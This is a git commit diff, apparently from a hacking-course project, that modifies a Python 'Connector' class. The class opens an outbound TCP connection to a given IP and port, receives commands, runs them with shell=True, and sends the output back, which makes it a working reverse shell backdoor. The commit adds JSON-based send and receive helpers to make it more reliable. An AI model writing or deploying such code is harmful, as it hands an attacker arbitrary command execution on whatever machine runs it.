3b7d64a56ad0f9f3c9d3c96bc45fa8bf10baec4e
denier1025 <denier1025@gmail.com>
2018-09-03 20:10:13 -0400

    some changes

--- tcp_socket_connector/connector.py
+++ tcp_socket_connector/connector.py
@@ -2,16 +2,30 @@
 
 import socket
 import subprocess
+import json
 
 class Connector:
     def __init__(self, ip, port):
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
 
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data += self.connection.recv(1380)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
     def run(self):
         while True:
             print("ON")
-            command = self.connection.recv(1024)
+            command = self.reliable_receive()
             command_result = subprocess.check_output(command, shell=True)
-            self.connection.send(command_result)
+            self.reliable_send(command_result)
         connection.close()
